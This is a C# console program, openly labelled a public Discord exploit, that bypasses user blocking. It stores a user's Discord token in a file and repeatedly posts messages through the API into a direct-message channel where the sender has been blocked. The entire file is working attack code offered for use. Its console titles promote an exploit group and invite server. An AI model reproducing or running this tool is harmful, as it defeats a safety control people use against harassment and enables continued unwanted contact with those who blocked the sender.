using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace DiscordBlockBypass
{
    class Program
    {
        static string UserToken { get; set; }

        static void ForceSendMessage(string channelId, string message)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", UserToken);
                    var response = client.PostAsync($"https://discordapp.com/api/v6/channels/{channelId}/messages", new StringContent(JsonConvert.SerializeObject(new MessageBody() { content = message, nonce = null, tts = false }), Encoding.UTF8, "application/json"));
                    if (response.Result.StatusCode == System.Net.HttpStatusCode.OK) Console.WriteLine($"Successfully force sent message to channelId: {channelId}. Fix your shit discord.");
                }
            }
            catch(Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Something went wrong. Exception Details: {e.ToString()} || Please Report this to Yaekith on telegram.");
                Console.ForegroundColor = ConsoleColor.White;
            }
        }

        static void Main(string[] args)
        {
            try
            {
                Console.Title = "https://exploiting-discord-for.fun || Discord Exploiter Squad was here || https://discord.gg/anarchyy (https://discord.gg/HUXcxEu) || Public Exploit: Block Bypass Meme (Found by Yaekith in 2018)";
                if (!File.Exists("Token.txt"))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("No Token file was found. Please enter a token: ");
                    string token = Console.ReadLine();
                    File.WriteAllText("Token.txt", token);
                    Console.ForegroundColor = ConsoleColor.White;
                }
                UserToken = File.ReadAllText("Token.txt");
                Console.WriteLine("Enter Message Link: ");
                string link = Console.ReadLine();
                if (!link.Contains("discordapp.com/channels/@me"))
                {
                    Console.WriteLine("Invalid Message Link. Press any key and try again.");
                    Console.ReadLine();
                    Console.Clear();
                    Main(null);
                }
                else
                {
                    var ChannelID = link.Split('/')[5].Split('/')[0];
                    Console.Title = $"https://exploiting-discord-for.fun || Public Exploit: Block Bypass Meme (Found by Yaekith in 2018) || Locked Channel: {ChannelID.ToString()}";
                    Console.WriteLine($"Sending Messages to ChannelID: {ChannelID}");
                    for (; ; )
                    {
                        Console.WriteLine("Enter Message to Send: ");
                        string msg = Console.ReadLine();
                        ForceSendMessage(ChannelID, msg);
                    }
                }
            }
            catch(Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Something went wrong. Exception Details: {e.ToString()} || Please Report this to Yaekith on telegram.");
                Console.ForegroundColor = ConsoleColor.White;
            }
            Console.ReadLine();
        }
    }
}
